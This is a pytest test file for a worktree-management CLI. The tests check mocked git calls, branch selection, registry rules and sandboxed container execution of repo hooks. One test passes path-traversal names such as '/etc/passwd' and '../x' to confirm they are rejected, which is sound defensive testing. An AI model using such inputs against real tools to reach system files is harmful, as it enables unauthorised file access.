"""worktree.py — `foldyard worktree add|list`. git + the machine are mocked, so nothing
touches a real repo; we assert the right git invocations and the config-driven init hook."""

from __future__ import annotations

import os
import shutil
import subprocess
import sys
from pathlib import Path
from typing import Any

import pytest

import yard_stub
from foldyard import (
    box,
    config,
    crossmask,
    machine,
    stack,
    worktree,
    worktree_published,
    worktree_registry,
)

BRANCH_OID = "1" * 40  # what every refs/heads/<branch> resolves to here


class _Proc:
    def __init__(self, returncode=0, stdout=""):
        self.returncode = returncode
        self.stdout = stdout


@pytest.fixture
def fake_main(tmp_path, monkeypatch):
    """A fake main repo + worktrees root; machine.ensure stubbed; subprocess.run recorded.
    `refs` controls which `show-ref --verify` checks succeed (branch resolution)."""
    main = tmp_path / "repo"
    main.mkdir()
    wt_root = tmp_path / "repo-worktrees"
    monkeypatch.setattr(stack, "main_repo", lambda: main)
    # The adoption step resolves main (its adopted pin is the baseline) through devmode's anchor.
    from foldyard import devmode

    monkeypatch.setattr(devmode, "main_repo", lambda: main)
    # No terminal unless a test says so — the adoption prompt is only offered on one.
    monkeypatch.setattr(worktree, "_stdin_is_tty", lambda: False)
    monkeypatch.setattr(config, "worktrees_root", lambda m: wt_root)
    monkeypatch.setattr(config, "project_prefix", lambda: "proj")
    state_dir = tmp_path / "state"
    monkeypatch.setattr(config, "state_dir", lambda: state_dir)
    monkeypatch.setattr(machine, "ensure", lambda *a, **k: None)
    monkeypatch.setattr(config, "worktree_init", lambda: None)
    monkeypatch.setattr(
        config, "worktree_base", lambda: None
    )  # no [machine].worktree_base override
    # add/remove are host-only; the suite itself may run inside a dev box (IN_DEVBOX set).
    monkeypatch.setattr(config, "in_box", lambda: False)
    monkeypatch.delenv("WORKTREE", raising=False)

    calls: list[list[str]] = []
    # `refs`: full refnames `show-ref --verify` finds (branch resolution). `resolves`: refs
    # `rev-parse --verify` finds (base-branch detection); default repo trunk is local `main`.
    # `origin_head`: the `symbolic-ref refs/remotes/origin/HEAD` target, unset by default.
    # `registered`: worktree paths `worktree list --porcelain` reports (git still tracks them).
    state: dict[str, Any] = {
        "refs": set(),
        "resolves": {"main"},
        "origin_head": None,
        "registered": set(),
        "list_rc": 0,  # what `worktree list` exits with
        "list_hangs": False,  # `worktree list` blocks (a FIFO in main's records) until its timeout
        "listed_branch": {},  # path → the branch `worktree list` names for it (default: none)
    }
    teardown: list[str] = []  # records the box+stack teardown remove() drives

    # remove() tears down the worktree's dev box + stack (+ the box's shadow volumes) before
    # git-removing it; stub all three so the test never touches a real engine, recording the
    # order they fire (and the WORKTREE they were aimed at, which remove() exports for them).
    monkeypatch.setattr(
        box,
        "main",
        lambda cmd, *a, **k: teardown.append(f"box:{cmd}:{os.environ.get('WORKTREE', '')}") or 0,
    )
    monkeypatch.setattr(
        stack,
        "nuke",
        lambda *a, **k: teardown.append(f"nuke:{os.environ.get('WORKTREE', '')}") or 0,
    )
    monkeypatch.setattr(
        stack,
        "remove_devbox_volumes",
        # Records the explicit project= (the checkout-gone retry path) or the WORKTREE env
        # (the normal teardown path); returns 0 = "no volumes found".
        lambda *a, **k: (
            teardown.append(f"volumes:{k.get('project') or os.environ.get('WORKTREE', '')}") or 0
        ),
    )

    def fake_run(cmd, **kw):
        calls.append(cmd)
        g = cmd[:1] == ["git"]
        if g and "worktree" in cmd and "add" in cmd:  # git creates the checkout, as for real
            wt_dir = next(Path(a) for a in cmd if a.startswith(str(wt_root)))
            wt_dir.mkdir(parents=True, exist_ok=True)
            (wt_dir / ".git").write_text(f"gitdir: {main}/.git/worktrees/{wt_dir.name}\n")
            # …with the branch's committed foldyard.toml in it (here: main's, as a fork of it).
            if (main / "foldyard.toml").exists():
                shutil.copy(main / "foldyard.toml", wt_dir / "foldyard.toml")
            state["registered"].add(str(wt_dir))
            return _Proc(0)
        if g and "worktree" in cmd and "list" in cmd:  # registration probe (orphan detection)
            if state["list_hangs"]:
                raise subprocess.TimeoutExpired(cmd, kw.get("timeout") or 0)
            # Porcelain, as git writes it: each path verbatim, newlines and all.
            listing = "".join(
                f"worktree {p}\nHEAD {BRANCH_OID}\n"
                + (f"branch refs/heads/{b}\n" if (b := state["listed_branch"].get(p)) else "")
                + "\n"
                for p in state["registered"]
            )
            return _Proc(state["list_rc"], "" if state["list_rc"] else listing)
        if g and "show-ref" in cmd:
            return _Proc(0 if cmd[-1] in state["refs"] else 1)
        if g and "symbolic-ref" in cmd:  # origin/HEAD default-branch pointer
            head = state["origin_head"]
            return _Proc(0, head + "\n") if head else _Proc(1)
        if g and "rev-parse" in cmd and "--verify" in cmd:  # base-branch resolution
            target = cmd[-1].removesuffix("^{commit}")
            if target.startswith("refs/heads/"):  # the commit the yard checks out
                return _Proc(0, BRANCH_OID + "\n")
            return _Proc(0 if target in state["resolves"] else 1)
        if g and "rev-parse" in cmd:  # --abbrev-ref HEAD (current branch)
            return _Proc(0, "main")
        return _Proc(0)

    monkeypatch.setattr(worktree.subprocess, "run", fake_run)
    # The checkout's container: recorded in yard["runs"] and answered, never run.
    yard = yard_stub.install(monkeypatch, mode="none")
    yield {
        "main": main,
        "wt_root": wt_root,
        "state_dir": state_dir,
        "calls": calls,
        "state": state,
        "teardown": teardown,
        "yard": yard,
    }
    os.environ.pop("WORKTREE", None)  # remove() sets it directly; don't leak into other tests


def _worktree_add_argv(calls):
    """The `git -C <main> worktree add …` call, sliced from `worktree` onward."""
    cmd = next(c for c in calls if "worktree" in c and "add" in c)
    return cmd[cmd.index("worktree") :]


def test_add_new_branch_default_name(fake_main):
    assert worktree.add("feat") == 0
    argv = _worktree_add_argv(fake_main["calls"])
    # No existing ref → create a new branch named wt/<name>, forked off the DEFAULT branch
    # (local `main` here) — NOT the primary checkout's current HEAD. The wt dir precedes the base.
    assert argv[:6] == ["worktree", "add", "--no-checkout", "--no-track", "-b", "wt/feat"]
    assert argv[-2] == str(fake_main["wt_root"] / "feat")
    assert argv[-1] == "main"


def test_add_new_branch_prefers_origin_head(fake_main):
    # When the remote declares a default branch (origin/HEAD → origin/main), fork off THAT —
    # with --no-track, so origin/main never becomes the branch's upstream (a tracked
    # origin/main makes GUI "push" actions push the feature branch straight to main).
    fake_main["state"]["origin_head"] = "refs/remotes/origin/main"
    fake_main["state"]["resolves"].add("origin/main")
    assert worktree.add("feat") == 0
    argv = _worktree_add_argv(fake_main["calls"])
    assert argv[:6] == ["worktree", "add", "--no-checkout", "--no-track", "-b", "wt/feat"]
    assert argv[-1] == "origin/main"


def test_add_new_branch_explicit_from(fake_main):
    # `--from` (base) overrides auto-detection when it resolves.
    fake_main["state"]["resolves"].add("release/2.0")
    assert worktree.add("feat", base="release/2.0") == 0
    argv = _worktree_add_argv(fake_main["calls"])
    assert argv[-1] == "release/2.0"


def test_add_explicit_from_unresolvable_errors(fake_main):
    # A `--from` that names nothing is rejected before git worktree add runs.
    assert worktree.add("feat", base="nope/nowhere") == 1
    assert not any("worktree" in c and "add" in c for c in fake_main["calls"])


def test_add_new_branch_falls_back_to_head_when_no_default(fake_main):
    # Unusual repo: no origin/HEAD and no main/master → fall back to git's default (current HEAD),
    # i.e. no base appended, wt dir stays last (the pre-fix behaviour, preserved as a safety net).
    fake_main["state"]["resolves"].clear()
    assert worktree.add("feat") == 0
    argv = _worktree_add_argv(fake_main["calls"])
    assert argv[:6] == ["worktree", "add", "--no-checkout", "--no-track", "-b", "wt/feat"]
    assert argv[-1] == str(fake_main["wt_root"] / "feat")


def test_add_new_branch_config_base_override(fake_main, monkeypatch):
    # [machine].worktree_base / FOLDYARD_WORKTREE_BASE pins the base explicitly.
    monkeypatch.setattr(config, "worktree_base", lambda: "develop")
    fake_main["state"]["resolves"].add("develop")
    assert worktree.add("feat") == 0
    assert _worktree_add_argv(fake_main["calls"])[-1] == "develop"


def test_add_config_base_override_unresolvable_warns_and_autodetects(
    fake_main, monkeypatch, capsys
):
    # A configured [machine].worktree_base that no longer resolves must NOT be dropped silently
    # (that would fork off the current HEAD). It warns, then falls through to auto-detection —
    # here local `main` still resolves, so the new branch forks off `main`, not the override.
    monkeypatch.setattr(config, "worktree_base", lambda: "gone/deleted")  # not in resolves
    assert worktree.add("feat") == 0
    assert _worktree_add_argv(fake_main["calls"])[-1] == "main"  # auto-detected, not the override
    err = capsys.readouterr().err
    assert "gone/deleted" in err and "doesn't resolve" in err


def test_add_notes_from_ignored_when_branch_exists(fake_main, capsys):
    # `--from` only applies to the new-branch path; on an existing branch it can't take effect,
    # so add() emits a notice rather than silently dropping it.
    fake_main["state"]["refs"].add("refs/heads/mybranch")
    assert worktree.add("wt1", "mybranch", base="release/2.0") == 0
    out = capsys.readouterr().out
    assert "release/2.0 ignored" in out and "already exists" in out
    # The existing branch is still checked out directly (base had no effect on argv).
    assert _worktree_add_argv(fake_main["calls"])[-1] == "mybranch"


def test_add_existing_local_branch(fake_main):
    fake_main["state"]["refs"].add("refs/heads/mybranch")
    assert worktree.add("wt1", "mybranch") == 0
    argv = _worktree_add_argv(fake_main["calls"])
    # Existing local branch → checked out directly (no -b).
    assert "-b" not in argv and argv[-1] == "mybranch"


def test_add_existing_remote_branch(fake_main):
    fake_main["state"]["refs"].add("refs/remotes/origin/feature")
    assert worktree.add("wt2", "feature") == 0
    argv = _worktree_add_argv(fake_main["calls"])
    # Remote-only branch → -b <branch> ... origin/<branch>.
    assert "-b" in argv and argv[-1] == "origin/feature"


def test_add_refuses_existing_dir(fake_main):
    (fake_main["wt_root"] / "dup").mkdir(parents=True)
    assert worktree.add("dup") == 1
    assert worktree_registry.checkouts(fake_main["main"]) == {}


# ── the host's worktree registry: only `add` records a worktree the host may act on ──────────


def _existing_git_worktree(fake_main, name="old"):
    wt = fake_main["wt_root"] / name
    wt.mkdir(parents=True)
    (wt / ".git").write_text("gitdir: x\n")
    fake_main["state"]["registered"].add(str(wt))
    return wt


def test_add_registers_the_new_worktree(fake_main):
    assert worktree.add("feat") == 0
    assert worktree_registry.checkouts(fake_main["main"]) == {
        "feat": (fake_main["wt_root"] / "feat").resolve()
    }


def test_add_on_an_existing_git_worktree_confirms_then_registers(fake_main, monkeypatch, capsys):
    # A worktree from before the registry (or made with plain `git worktree add`) comes back
    # under host management through the same verb — after the operator has seen its real path.
    wt = _existing_git_worktree(fake_main)
    monkeypatch.setattr("builtins.input", lambda *a: "y")
    assert worktree.add("old") == 0
    assert str(wt.resolve()) in capsys.readouterr().out
    assert worktree_registry.checkouts(fake_main["main"]) == {"old": wt.resolve()}
    assert not any("worktree" in c and "add" in c for c in fake_main["calls"])  # no git add


def test_add_refuses_a_branch_checked_out_in_a_worktree_made_outside_fy(fake_main, capsys):
    # Git would refuse it too ("already used by worktree at …"), after the VM and the yard were
    # readied; only fy can say that worktree isn't one it manages, before anything is made.
    held = fake_main["main"].parent / "elsewhere"
    fake_main["state"]["registered"].add(str(held))
    fake_main["state"]["listed_branch"][str(held)] = "wt/feat"
    assert worktree.add("feat") == 1
    err = capsys.readouterr().err
    assert "branch 'wt/feat' is checked out in a worktree made outside fy" in err
    assert f"`git worktree remove {held}`" in err
    assert not (fake_main["wt_root"] / "feat").exists()
    assert not any("add" in c and "worktree" in c for c in fake_main["calls"])  # no git add


def test_add_refuses_a_place_another_project_claims(fake_main, monkeypatch, capsys):
    # A root declared on another project's checkout (adopted before that was refused) would put
    # the new worktree inside it: config.claimed_elsewhere says so, before anything is made.
    asked: list = []
    monkeypatch.setattr(
        worktree.config,
        "claimed_elsewhere",
        lambda path, main: asked.append(path) or "the worktree x is inside y, bravo's checkout",
    )
    assert worktree.add("feat") == 1
    assert asked == [fake_main["wt_root"] / "feat"]
    assert "✗ the worktree x is inside y, bravo's checkout" in capsys.readouterr().err
    assert not (fake_main["wt_root"] / "feat").exists()
    assert not any("add" in c and "worktree" in c for c in fake_main["calls"])


def test_add_asks_again_right_before_git_makes_the_checkout(fake_main, monkeypatch, capsys):
    # The VM and the yard are readied in between, and the root inside main is the box's to swap.
    answers = iter([None, "the worktrees root is reached through a link"])
    monkeypatch.setattr(worktree.config, "claimed_elsewhere", lambda path, main: next(answers))
    assert worktree.add("feat") == 1
    assert "✗ the worktrees root is reached through a link" in capsys.readouterr().err
    assert not any("add" in c and "worktree" in c for c in fake_main["calls"])


@pytest.mark.parametrize("where", ["registered", "in the worktrees root"])
def test_a_branch_one_fy_can_take_in_holds_is_left_to_git(fake_main, where):
    # A registered worktree's, or one in the worktrees root (`fy worktree add <its name>` takes
    # it in): git's own refusal names it.
    if where == "registered":
        assert worktree.add("feat") == 0
        held = fake_main["wt_root"] / "feat"
    else:
        held = _existing_git_worktree(fake_main, "plain")
    fake_main["state"]["listed_branch"][str(held)] = "wt/other"
    assert not worktree._refuse_branch_outside_fy(fake_main["main"], "wt/other")


def test_add_on_an_existing_worktree_declined_registers_nothing(fake_main, monkeypatch):
    _existing_git_worktree(fake_main)
    monkeypatch.setattr("builtins.input", lambda *a: "")
    assert worktree.add("old") == 1
    assert worktree_registry.checkouts(fake_main["main"]) == {}


def test_add_on_an_existing_worktree_with_yes_skips_the_prompt(fake_main, monkeypatch):
    wt = _existing_git_worktree(fake_main)
    monkeypatch.setattr("builtins.input", lambda *a: pytest.fail("prompted despite --yes"))
    assert worktree.add("old", assume_yes=True) == 0
    assert worktree_registry.checkouts(fake_main["main"]) == {"old": wt.resolve()}


def _answers(monkeypatch, *answers):
    given = list(answers)
    asked: list[str] = []

    def answer(prompt=""):
        asked.append(prompt)
        return given.pop(0)

    monkeypatch.setattr("builtins.input", answer)
    return asked


@pytest.fixture
def shadowed(fake_main, monkeypatch):
    monkeypatch.setattr(config, "box_shadow_volumes", lambda: ["web/node_modules"])
    monkeypatch.setattr(worktree, "_say_unmasked", lambda *a, **k: None)
    return fake_main


def test_registering_says_first_that_other_boxes_lose_its_dependencies(
    shadowed, monkeypatch, capsys
):
    # An agent in main's box was working in one when it was registered: its installs and tests
    # stopped, with no box of its own to go on in (Tangible, 2026-11-24).
    _existing_git_worktree(shadowed)
    said: list[str] = []

    def decline(prompt=""):
        said.append(capsys.readouterr().out)
        return ""

    monkeypatch.setattr("builtins.input", decline)
    assert worktree.add("old") == 1
    assert "read-only in every other box" in said[0]  # before the answer, not after


@pytest.mark.parametrize("existing", [True, False])
def test_the_list_a_box_reads_has_the_ports_just_claimed(fake_main, monkeypatch, existing):
    # Published when it's registered, and again with its ports: a box may ask in between.
    seen: list[str] = []
    monkeypatch.setattr(worktree_published, "publish", lambda main: seen.append("published"))
    monkeypatch.setattr(worktree, "_claim_ports", lambda *a, **k: seen.append("claimed") or True)
    if existing:
        _existing_git_worktree(fake_main)
    assert worktree.add("old", assume_yes=True) == 0
    assert seen == ["published", "claimed", "published"]


def test_registering_offers_its_box_and_starts_it(shadowed, monkeypatch):
    _existing_git_worktree(shadowed)
    runs = _box_runs(monkeypatch)
    asked = _answers(monkeypatch, "y", "")
    assert worktree.add("old") == 0
    assert "Start its box" in asked[1]
    assert len(runs) == 1 and runs[0]["env"]["WORKTREE"] == "old"


def test_registering_takes_no_for_its_box_and_says_how(shadowed, monkeypatch, capsys):
    _existing_git_worktree(shadowed)
    runs = _box_runs(monkeypatch)
    _answers(monkeypatch, "y", "n")
    assert worktree.add("old") == 0
    assert not runs and "WORKTREE=old fy box up" in capsys.readouterr().out


def test_registering_with_box_asks_nothing_more(shadowed, monkeypatch):
    _existing_git_worktree(shadowed)
    runs = _box_runs(monkeypatch)
    asked = _answers(monkeypatch, "y")
    assert worktree.add("old", box_up=True) == 0
    assert len(asked) == 1 and len(runs) == 1


def test_registering_with_yes_starts_no_box_unasked(shadowed, monkeypatch, capsys):
    _existing_git_worktree(shadowed)
    runs = _box_runs(monkeypatch)
    assert worktree.add("old", assume_yes=True) == 0
    out = capsys.readouterr().out
    assert not runs and "read-only in every other box" in out and "WORKTREE=old fy box up" in out


def test_registering_a_project_with_no_dependency_dirs_offers_nothing(fake_main, monkeypatch):
    _existing_git_worktree(fake_main)
    monkeypatch.setattr(config, "box_shadow_volumes", lambda: [])
    asked = _answers(monkeypatch, "y")
    assert worktree.add("old") == 0 and len(asked) == 1


def test_add_refuses_to_register_a_dir_git_does_not_track(fake_main):
    # A checkout-looking dir the box planted: git has no worktree metadata for it.
    wt = fake_main["wt_root"] / "planted"
    wt.mkdir(parents=True)
    (wt / ".git").write_text("gitdir: x\n")
    assert worktree.add("planted", assume_yes=True) == 1
    assert worktree_registry.checkouts(fake_main["main"]) == {}


def test_add_refuses_to_register_a_symlink(fake_main, tmp_path):
    other = tmp_path / "someone-elses-checkout"
    other.mkdir()
    (other / ".git").mkdir()
    fake_main["wt_root"].mkdir(parents=True)
    (fake_main["wt_root"] / "link").symlink_to(other)
    fake_main["state"]["registered"].add(str(other))
    assert worktree.add("link", assume_yes=True) == 1
    assert worktree_registry.checkouts(fake_main["main"]) == {}


def _is_checkout(cmd: list[str]) -> bool:
    return "--entrypoint" in cmd and cmd[cmd.index("--entrypoint") + 1] == "git"


def _engine_with(monkeypatch, fake_main, running: list[str], mounts: dict[str, list] | None = None):
    """The golden engine for the late-worktree report: `ps` lists ``running``; a box's
    ``{{json .Mounts}}`` is ``mounts[box]``. Dead socket in the env, every call recorded."""
    import json

    monkeypatch.setattr(config, "box_shadow_volumes", lambda: ["node_modules"])
    from foldyard import devmode

    monkeypatch.setattr(devmode, "_engine_env", lambda: {"DOCKER_HOST": "unix:///nonexistent/x"})
    inner = worktree.subprocess.run
    engine_calls: list[list[str]] = []

    def run(cmd, **kw):
        if cmd[0] != "podman" or cmd in fake_main["yard"]["runs"] or _is_checkout(cmd):
            return inner(cmd, **kw)  # the add's own checkout: yard_stub's
        engine_calls.append(cmd)
        assert kw["env"]["DOCKER_HOST"] == "unix:///nonexistent/x"
        if cmd[1] == "ps":
            return _Proc(0, "".join(f"{n}\n" for n in running))
        if cmd[1] == "inspect":
            return _Proc(0, json.dumps((mounts or {}).get(cmd[2], [])))
        return _Proc(1)

    monkeypatch.setattr(worktree.subprocess, "run", run)
    return engine_calls


def test_add_names_running_boxes_that_do_not_mask_the_new_worktree(fake_main, monkeypatch, capsys):
    _existing_git_worktree(fake_main, "other")
    worktree_registry.register(fake_main["main"], "other", fake_main["wt_root"] / "other")
    calls = _engine_with(monkeypatch, fake_main, ["proj-devbox", "proj-other-devbox", "x-devbox"])
    assert worktree.add("feat") == 0
    out = capsys.readouterr().out
    # Both running boxes predate it, so neither can mask it — whatever their mounts say.
    assert "proj-devbox, proj-other-devbox" in out and "x-devbox" not in out
    assert "WORKTREE=feat fy box up" in out and "fy box recreate" in out
    assert not [c for c in calls if c[1] == "inspect"]
    assert not [c for c in calls if c[1] in ("rm", "run", "stop")]  # never recreates a box


def test_add_masks_the_new_worktree_in_running_boxes_and_names_only_the_rest(
    fake_main, monkeypatch, capsys
):
    from foldyard import crossinject

    _existing_git_worktree(fake_main, "other")
    worktree_registry.register(fake_main["main"], "other", fake_main["wt_root"] / "other")
    _engine_with(monkeypatch, fake_main, ["proj-devbox", "proj-other-devbox"])
    asked: list[tuple[str, list]] = []

    def inject(engine, box_name, env, masks, **kw):
        masks = list(masks)
        asked.append((box_name, masks))
        if box_name == "proj-other-devbox":  # say, a gVisor box
            return crossinject.Injected([], [(m, "it runs under gVisor") for m in masks], "x")
        return crossinject.Injected(masks, [], "")

    monkeypatch.setattr(crossinject, "inject", inject)
    assert worktree.add("feat") == 0
    out = capsys.readouterr().out
    wt = fake_main["wt_root"] / "feat"
    assert sorted(asked) == [
        ("proj-devbox", [crossmask.Mask("feat", f"{wt}/node_modules")]),
        ("proj-other-devbox", [crossmask.Mask("feat", f"{wt}/node_modules")]),
    ]
    assert "✓ masked 'feat' in proj-devbox without recreating it" in out
    assert "couldn't mask 'feat' in proj-other-devbox while it runs: it runs under gVisor" in out
    # the recreate hint names only the box it couldn't mask
    assert "don't mask its dependency dirs ([box].shadow_volumes): proj-other-devbox." in out


def test_add_says_nothing_about_boxes_without_declared_dirs(fake_main, monkeypatch, capsys):
    _engine_with(monkeypatch, fake_main, ["proj-devbox"])
    monkeypatch.setattr(config, "box_shadow_volumes", lambda: [])
    assert worktree.add("feat") == 0
    assert "mask" not in capsys.readouterr().out


def test_registering_an_existing_worktree_asks_each_box_what_it_masks(
    fake_main, monkeypatch, capsys
):
    wt = _existing_git_worktree(fake_main, "old")
    main = fake_main["main"]
    covered = [
        {
            "Type": "volume",
            "Name": "proj-elsewhere",
            "Destination": f"{wt}/node_modules",
            "RW": False,
        }
    ]
    _engine_with(
        monkeypatch,
        fake_main,
        ["proj-devbox"],
        {"proj-devbox": [*covered, {"Type": "volume", "Destination": f"{main}/node_modules"}]},
    )
    assert worktree.add("old", assume_yes=True) == 0
    assert "proj-devbox" not in capsys.readouterr().out  # it already masks old's dirs

    _engine_with(monkeypatch, fake_main, ["proj-devbox"], {"proj-devbox": []})
    worktree_registry.unregister(main, "old")
    assert worktree.add("old", assume_yes=True) == 0
    assert "proj-devbox" in capsys.readouterr().out


def test_remove_unregisters(fake_main):
    assert worktree.add("feat") == 0
    assert worktree.remove("feat", assume_yes=True) == 0
    assert worktree_registry.checkouts(fake_main["main"]) == {}
    assert not worktree_registry.is_recorded(fake_main["main"], "feat")


def test_remove_clears_a_record_whose_checkout_is_already_gone(fake_main):
    import shutil

    assert worktree.add("feat") == 0
    shutil.rmtree(fake_main["wt_root"] / "feat")  # deleted out-of-band
    assert worktree.remove("feat", assume_yes=True) == 0
    assert not worktree_registry.is_recorded(fake_main["main"], "feat")


def test_add_refuses_reserved_name_main(fake_main):
    # "main" is the positional label for the primary checkout (workspaces view + posture dir);
    # a worktree named "main" would alias it. Reject before any git runs.
    assert worktree.add("main") == 1
    assert not fake_main["calls"]  # bailed before shelling git


def test_add_refuses_reserved_name_worktrees(fake_main):
    # vscode/<name> for the name "worktrees" IS the legacy vscode state root, so removing that
    # worktree's state would rmtree every worktree's legacy state. Reserved outright.
    assert worktree.add("worktrees") == 1
    assert not fake_main["calls"]


@pytest.mark.parametrize("name", ["feat/x", "..", ".", "a/b/c", "/", "/etc", "/etc/passwd"])
def test_add_refuses_multi_component_name(fake_main, name):
    # devmode.worktree_keys() only discovers ONE level under wt_root (iterdir(), not
    # recursive), so a nested name like "feat/x" would silently never be discovered — the
    # worktree would exist on disk but every posture/status/devbox-up check would treat it as
    # absent forever. Reject before any git runs, same as the reserved-name checks above.
    # Absolute names ("/", "/etc") are worse: Path("/").parts has length 1, and wt_root / name
    # for an absolute name discards wt_root entirely (pathlib join semantics), pointing git
    # worktree operations at an arbitrary filesystem path.
    assert worktree.add(name) == 1
    assert not fake_main["calls"]


@pytest.mark.parametrize(
    ("name", "branch", "hint"),
    [
        # A branch-shaped name is the usual slip: the first argument is the DIR, not the branch.
        ("sec/vuln-bumps", "", "fy worktree add sec-vuln-bumps sec/vuln-bumps"),
        ("a/b/c", "", "fy worktree add a-b-c a/b/c"),
        # An explicit branch is kept as given; only the dir name is suggested.
        ("feat/x", "other", "fy worktree add feat-x other"),
        # The suggested branch is the name's parts rejoined, so stray slashes don't carry over.
        ("a/b/", "", "fy worktree add a-b a/b"),
        ("a//b", "", "fy worktree add a-b a/b"),
    ],
)
def test_add_suggests_a_dir_name_for_a_branch_shaped_name(fake_main, capsys, name, branch, hint):
    assert worktree.add(name, branch) == 1
    assert f"did you mean `{hint}`?" in capsys.readouterr().err
    assert not fake_main["calls"]


@pytest.mark.parametrize("name", ["..", ".", "/", "/etc", "../x", "x/.."])
def test_add_suggests_nothing_for_a_name_that_is_not_branch_shaped(fake_main, capsys, name):
    # Absolute or dot-segment names aren't a mistyped branch; a dashed rewrite would be nonsense.
    assert worktree.add(name) == 1
    assert "did you mean" not in capsys.readouterr().err


@pytest.mark.parametrize(
    ("name", "branch"),
    [
        ("a/b.lock", ""),
        ("a b/c", ""),
        ("x/~y", ""),
        ("a/.b", ""),
        ("feat/x", "bad..branch"),
        ("feat/x", "HEAD"),
        ("-a/b", "ok"),
    ],
)
def test_add_suggests_nothing_git_would_refuse_as_a_branch(fake_main, capsys, name, branch):
    # A hint that names a branch git rejects can't succeed: say only what was wrong.
    assert worktree.add(name, branch) == 1
    err = capsys.readouterr().err
    assert "must be a single relative path component" in err
    assert "did you mean" not in err


@pytest.mark.parametrize(
    "name",
    [
        "sec/x",
        "a/b/c",
        "wt/x",
        "a@b",
        "a/-b",
        "ä/ü",
        "a//b",
        "a/b/",
        "a/b.lock",
        "a b",
        "a~b",
        "a..b",
        "a@{b",
        "-a",
        "HEAD",
        "head",
        "feat/HEAD",
        "a.",
        ".a",
        "a/.",
        "x\x01y",
        "a\\b",
        "a[b",
        "a:b",
    ],
)
def test_branch_name_check_agrees_with_git(name):
    # The hint's gate is git's own rule, checked in-process: pinned here against the real thing.
    git = subprocess.run(["git", "check-ref-format", "--branch", name], capture_output=True)
    assert worktree._branch_name_ok(name) is (git.returncode == 0)


def _init_hook(monkeypatch, main, *, image: bool = True):
    """Point `[project].worktree_init` at a script that EXISTS, with the yard's engine + image
    stubbed. The script is a repo file, so it runs in a container, never on the host."""
    (main / "scripts").mkdir(parents=True, exist_ok=True)
    (main / "scripts" / "init-worktree.sh").write_text("#!/bin/sh\necho hi\n")
    monkeypatch.setattr(config, "worktree_init", lambda: "scripts/init-worktree.sh")
    monkeypatch.setattr(box, "image_exists", lambda *a: image)  # engine + image: yard_stub's


def test_what_the_init_hook_says_reaches_your_terminal_through_the_cleaner(fake_main, monkeypatch):
    # The script is a repo file the box can write: what it prints is relayed with its control
    # sequences stripped, never handed your terminal.
    _init_hook(monkeypatch, fake_main["main"])
    assert worktree.add("feat") == 0
    (run,) = [c for c in fake_main["calls"] if c[:2] == ["podman", "run"]]
    assert run in fake_main["yard"]["relayed"]


def test_add_runs_the_init_hook_in_a_container_not_on_the_host(fake_main, monkeypatch):
    # The init script is a REPO file whose only job is copying gitignored config between two
    # checkouts — both inside the mount — so it needs no host privileges, and running it on the host
    # made `worktree add` a host-code-execution trigger for whatever the checkout contained
    # (ADR-0023).
    _init_hook(monkeypatch, fake_main["main"])
    assert worktree.add("feat") == 0
    assert len(fake_main["yard"]["runs"]) == 1  # the checkout's run, before the hook's below
    assert not any(c[:1] == ["sh"] for c in fake_main["calls"])  # never `sh <repo script>` directly
    (run,) = [c for c in fake_main["calls"] if c[:2] == ["podman", "run"]]
    assert "--rm" in run  # one-off: no container left behind
    # Mounts are main + the worktrees root (both already in the VM's mount set); the interpreter is
    # explicit so the image's own entrypoint can't mangle the script's args.
    assert f"{fake_main['main']}:{fake_main['main']}" in run
    assert f"{fake_main['wt_root']}:{fake_main['wt_root']}" in run
    assert run[run.index("--entrypoint") + 1] == "sh"
    assert run[run.index("-w") + 1] == str(fake_main["wt_root"] / "feat")
    assert run[-2:] == ["--source", str(fake_main["main"])]


def test_init_skips_the_hook_when_the_box_image_is_missing(fake_main, monkeypatch, capsys):
    # No image to run it in ⇒ SKIP with the command to run later. Deliberately NOT a host fallback:
    # "the yard wasn't ready" must never silently become "so we ran it on your computer". (`add`
    # itself refuses earlier without an image: its checkout needs one too.)
    _make_wt(fake_main)
    _init_hook(monkeypatch, fake_main["main"], image=False)
    assert worktree.init_config("feat") == 0
    assert not any(c[:2] == ["podman", "run"] for c in fake_main["calls"])
    assert "fy worktree init feat" in capsys.readouterr().err


def test_add_refuses_without_an_image_to_check_out_in(fake_main, monkeypatch, capsys):
    fake_main["yard"]["image"] = False
    assert worktree.add("feat", "topic") == 1
    assert not any("worktree" in c and "add" in c for c in fake_main["calls"])  # no git ran
    assert worktree_registry.checkouts(fake_main["main"]) == {}
    err = capsys.readouterr().err
    assert "fy box build && fy worktree add feat topic" in err


def test_what_the_checkout_says_reaches_your_terminal_through_the_cleaner(fake_main):
    # The container runs the filter drivers the box-writable .git names: what it prints is
    # relayed with its control sequences stripped, never handed your terminal.
    assert worktree.add("feat") == 0
    (run,) = fake_main["yard"]["runs"]
    assert fake_main["yard"]["relayed"] == [run]


def test_the_checkout_runs_in_a_one_off_container_with_nothing_but_the_mount(fake_main):
    assert worktree.add("feat") == 0
    (run,) = fake_main["yard"]["runs"]
    image = run.index(yard_stub.IMAGE)
    opts, git_argv = run[2:image], run[image + 1 :]
    assert "--rm" in opts
    # The box's own uid (the VM user), every capability dropped, no network, the same two mounts
    # worktree_init gets, at the paths your computer uses (the worktree's .git file names them).
    assert opts[opts.index("--user") + 1] == "0"
    assert opts[opts.index("--cap-drop") + 1] == "ALL"
    assert opts[opts.index("--network") + 1] == "none"
    assert opts[opts.index("--security-opt") + 1] == "label=disable"
    main, wt_root = fake_main["main"], fake_main["wt_root"]
    assert [opts[i + 1] for i, o in enumerate(opts) if o == "-v"] == [
        f"{main}:{main}",
        f"{wt_root}:{wt_root}",
    ]
    assert opts[opts.index("-w") + 1] == str(wt_root / "feat")
    # No HOME for git to read: the image user's is unreadable to capability-less root, and git
    # warned on every run that it couldn't open its global ignore/attributes there.
    assert [opts[i + 1] for i, o in enumerate(opts) if o == "-e"] == [
        "HOME=/nonexistent",
        "XDG_CONFIG_HOME=/nonexistent",
        "GIT_LFS_SKIP_SMUDGE=1",
    ]
    assert opts[opts.index("--entrypoint") + 1] == "git"
    # The image's own git (never the box's shim, which is not in the image): files + the worktree's
    # index from the commit resolved on your computer — no ref, no HEAD, no config written there.
    assert git_argv == ["-c", "filter.lfs.required=false", "read-tree", "--reset", "-u", BRANCH_OID]


def test_the_host_git_step_is_metadata_only_in_every_shape(fake_main):
    fake_main["state"]["refs"].update({"refs/heads/mine", "refs/remotes/origin/theirs"})
    for name, branch in (("a", ""), ("b", "mine"), ("c", "theirs")):
        assert worktree.add(name, branch) == 0
    adds = [c[c.index("worktree") :] for c in fake_main["calls"] if "worktree" in c and "add" in c]
    assert len(adds) == 3
